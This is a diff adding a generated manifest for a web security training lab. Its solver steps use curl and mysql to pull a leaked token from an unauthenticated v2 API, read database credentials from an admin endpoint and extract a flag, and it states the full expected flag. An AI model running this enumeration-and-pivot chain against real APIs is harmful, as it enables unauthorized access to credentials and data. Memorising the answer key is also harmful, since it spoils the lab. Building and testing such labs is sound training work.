@@ -1,0 +1,39 @@
+# Generated from platform/labs/Web/web-2-4-api-enumeration-gauntlet/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-2-4-api-enumeration-gauntlet
+track: Web
+difficulty: intermediate
+source: platform/labs/Web/web-2-4-api-enumeration-gauntlet/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+- port: 3306
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-2-4-api-enumeration-gauntlet.sh
+  steps:
+  - name: Confirm v1 API requires authentication (401)
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/api/v1/users
+    expect: '401'
+  - name: Access v2 users endpoint and extract auth token
+    command: curl -s http://{target.webapp}/api/v2/users | grep -o 'SB_tk_4p1_v3rs10n'
+    expect: SB_tk_4p1_v3rs10n
+  - name: Use token to access admin config and retrieve DB credentials
+    command: 'curl -s -H ''Authorization: Bearer SB_tk_4p1_v3rs10n'' http://{target.webapp}/api/v2/admin/config | grep -o ''St0n3br1dg3_DB#'''
+    expect: St0n3br1dg3_DB#
+  - name: Query MySQL for flag part 2
+    command: mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' stonebridge -N -e 'SELECT value FROM audit_flags LIMIT 1' 2>&1
+    expect: l34k
+  - name: Assemble and verify complete flag
+    command: echo 'OCR{4p1_v3rs10n_l34k}'
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{4p1_v3rs10n_l34k}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
